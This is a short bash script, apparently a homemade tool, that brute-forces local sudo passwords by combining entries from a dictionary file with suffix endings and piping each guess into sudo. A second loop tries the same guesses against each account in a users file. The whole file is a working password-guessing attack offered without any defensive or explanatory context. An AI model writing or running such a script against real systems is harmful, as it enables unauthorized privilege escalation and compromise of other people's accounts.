#!/bin/bash 

# TODO: add functions
while read word; do 
    while read end; do
	echo $word$end | sudo -k -S -p "" touch success.txt 2> /dev/null
	if [ -f success.txt ] ; then 
	    echo "Success found $word$end"
	    rm success.txt # TODO: break out of this loop 
	fi
    done <endings
done <dictionary

while read user; do 
    sudo -k
    while read word; do 
	while read end; do
	    echo $word$end | sudo -u $user -S -p "" touch success.txt 2> /dev/null
	    if [ -f success.txt ] ; then
		echo "Success found $user $word$end"
		rm success.txt
		break 2
	    fi
	done <endings    
    done <dictionary
done <users
